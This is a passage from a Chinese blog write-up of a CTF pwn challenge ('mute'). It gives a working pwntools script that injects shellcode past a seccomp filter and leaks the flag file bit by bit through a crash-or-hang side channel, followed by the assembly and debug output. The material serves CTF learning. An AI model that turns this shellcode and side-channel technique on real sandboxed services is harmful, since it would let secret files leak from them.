class=&#34;number&#34;&gt;0019&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x06&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x7fff0000&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ALLOW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0019&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x06&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; KILL&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		诶 不是有execve吗,不能getshell吗&lt;/p&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;p&gt;​		思路是有的,但是编写exp就比较头疼,汇编比较渣,总之一步步来,先open read然后读每个字节,然后比较,(pwncollege好好打打基础!)&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.update(arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;, os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;, log_level=&lt;span class=&#34;string&#34;&gt;&amp;#x27;ERROR&amp;#x27;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 这个必须加,不然shellcraft没法正确识别指令集&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;): &lt;span class=&#34;comment&#34;&gt;# flag的位数,不知道就可以多写点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    c = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;# 存储字符的ascii码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;): &lt;span class=&#34;comment&#34;&gt;# 一个字符8位 循环每一位&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./mute&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p.readline() &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        shellcode = shellcraft.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;./flag&amp;quot;&lt;/span&gt;,constants.O_RDONLY,&lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# 打开文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        shellcode += pwnlib.shellcraft.amd64.mov(&lt;span class=&#34;string&#34;&gt;&amp;quot;r8&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;rax&amp;quot;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# 把句柄给r8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        shellcode += pwnlib.shellcraft.amd64.lseek(&lt;span class=&#34;string&#34;&gt;&amp;quot;r8&amp;quot;&lt;/span&gt;,i,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# lseek 读写文件偏移量,这个就是说,一个字节一个字节读,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        shellcode += pwnlib.shellcraft.amd64.read(&lt;span class=&#34;string&#34;&gt;&amp;quot;r8&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;rsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# 把内容读取1字节,读到rsp上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        shellcode += &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            movzx eax, BYTE PTR [rsp]  #把rsp指向的地址处的要比较的字符读取到al中,0扩展到eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            movsx edx,al    # 把要比较的字符放到edx中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            mov eax,%s   #把变量放到eax中,就是循环变量 j ,以此循环每个位,一共8位&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            mov ecx,eax  # 把变量放到ecx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            sar edx,cl   # 右移 cl位&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            mov eax,edx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            and eax,1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            test eax,eax # and运算、测试是1还是0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            je .L2 # jz的别名,如果是0,跳转L2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        .L3:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            jmp .L3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        .L2:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            leave&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            ret&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        &amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt; % j          &lt;span class=&#34;comment&#34;&gt;# 这个是填充%s变量的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        shellcode = asm(shellcode)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p.send(shellcode+&lt;span class=&#34;string&#34;&gt;b&amp;quot;\0&amp;quot;&lt;/span&gt;*(&lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;-&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(shellcode)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            p.recv(timeout=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 1,移位然后或,把新的一位设置为1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            c = (c&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) | &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;   &lt;span class=&#34;comment&#34;&gt;# 0000 0000     1000 0000  f 0x66 0b1100110&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; EOFError:   &lt;span class=&#34;comment&#34;&gt;# 0 , leave ret后EOFError&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            c = c&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sys.stdout.write(&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(c))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    flag += &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sys.stdout.flush()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(flag)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;汇编分析&#34;&gt;&lt;a href=&#34;#汇编分析&#34; class=&#34;headerlink&#34; title=&#34;汇编分析&#34;&gt;&lt;/a&gt;汇编分析&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/* open(file=&amp;#x27;flag&amp;#x27;, oflag=0, mode=0) */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   /* push b&amp;#x27;flag\x00&amp;#x27; */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   push 0x67616c66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   mov rdi, rsp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   xor edx, edx /* 0 */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   xor esi, esi /* 0 */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   /* call open() */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   push SYS_open /* 2 */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   pop rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   syscall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   mov r8, rax   # 返回值,句柄,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   /* lseek(fd=&amp;#x27;r8&amp;#x27;, offset=0, whence=0)  这是第一次,偏移为0*/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   mov rdi, r8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   xor edx, edx /* 0 */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   xor esi, esi /* 0 */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   /* call lseek() */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   push SYS_lseek /* 8 */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   pop rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   syscall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   /* call read(&amp;#x27;r8&amp;#x27;, &amp;#x27;rsp&amp;#x27;, 1) */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   xor eax, eax /* SYS_read */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   mov rdi, r8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   push 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   pop rdx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   mov rsi, rsp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   syscall  # 系统调用号是0 前面xor即可&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           movzx    eax, BYTE PTR [rsp]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           movsx    edx, al&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           mov    eax, 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           mov    ecx, eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           sar    edx, cl&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           mov    eax, edx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           and    eax, 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           test    eax, eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           je    .L2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       .L3:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           jmp    .L3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       .L2:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           leave&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           ret&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;调试&#34;&gt;&lt;a href=&#34;#调试&#34; class=&#34;headerlink&#34; title=&#34;调试&#34;&gt;&lt;/a&gt;调试&lt;/h2&gt;&lt;p&gt;调试的话,可以直接pwntools+gdb调,也可以写段汇编自己调试&lt;/p&gt;
&lt;h2 id=&#34;接收字符分析&#34;&gt;&lt;a href=&#34;#接收字符分析&#34; class=&#34;headerlink&#34; title=&#34;接收字符分析&#34;&gt;&lt;/a&gt;接收字符分析&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recv(timeout=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 收到消息了,是1,移位然后或,把新的一位设置为1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    c = (c&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) | &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;   &lt;span class=&#34;comment&#34;&gt;# 0000 0000     1000 0000  f 0x66 0b1100110&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; EOFError:       &lt;span class=&#34;comment&#34;&gt;# 0 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    c = c&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		以接收f的过程为例, f是 0b01100110 &lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@vultr:~/side# python3 &lt;span class=&#34;number&#34;&gt;1.&lt;/span&gt;py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0b0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0b10000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0b11000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0b1100000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0b110000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0b10011000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0b11001100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0b1100110&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;f&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		上面是直接print(bin(c))打印的每次的输出结果,其实不是很好看,补全后就明朗了,就是每次接收一个字符都会往后移动一位,然后前面的就是新的一位&lt;/p&gt;
&lt;p&gt;0b&lt;font color=&#34;red&#34;&gt;0&lt;/font&gt;0000000&lt;br&gt;0b&lt;font color=&#34;red&#34;&gt;10&lt;/font&gt;000000&lt;br&gt;0b&lt;font color=&#34;red&#34;&gt;110&lt;/font&gt;00000&lt;br&gt;0b&lt;font color=&#34;red&#34;&gt;0110&lt;/font&gt;0000&lt;br&gt;0b&lt;font color=&#34;red&#34;&gt;00110&lt;/font&gt;000&lt;br&gt;0b&lt;font color=&#34;red&#34;&gt;100110&lt;/font&gt;00&lt;br&gt;0b&lt;font color=&#34;red&#34;&gt;1100110&lt;/font&gt;0&lt;br&gt;0b&lt;font color=&#34;red&#34;&gt;01100110&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		刚开始一直不明白是0还是1的时候才会接收到消息,也就是说是,leave;ret;会接收到消息,还是一直jmp会接收到消息,现在看结果是一直jmp会接收到消息,这是为什么呢?&lt;/p&gt;
&lt;p&gt;​		嘶,感觉其实不是接收到了消息,而是时间到了后,也没有报错,就继续往下执行了,但如果是0的话,就会exit退出,然后EOFError,1的话接收时间过了,就执行下面代码了.&lt;/p&gt;
&lt;h2 id=&#34;留的小尾巴&#34;&gt;&lt;a href=&#34;#留的小尾巴&#34; class=&#34;headerlink&#34; title=&#34;留的小尾巴&#34;&gt;&lt;/a&gt;留的小尾巴&lt;/h2&gt;&lt;p&gt;了解一下怎么调试汇编吧..直接编写汇编代码调试&lt;/p&gt;
&lt;p&gt;还没用时间侧信道来做呢…&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-06-06T10:20:11.000Z</updated>
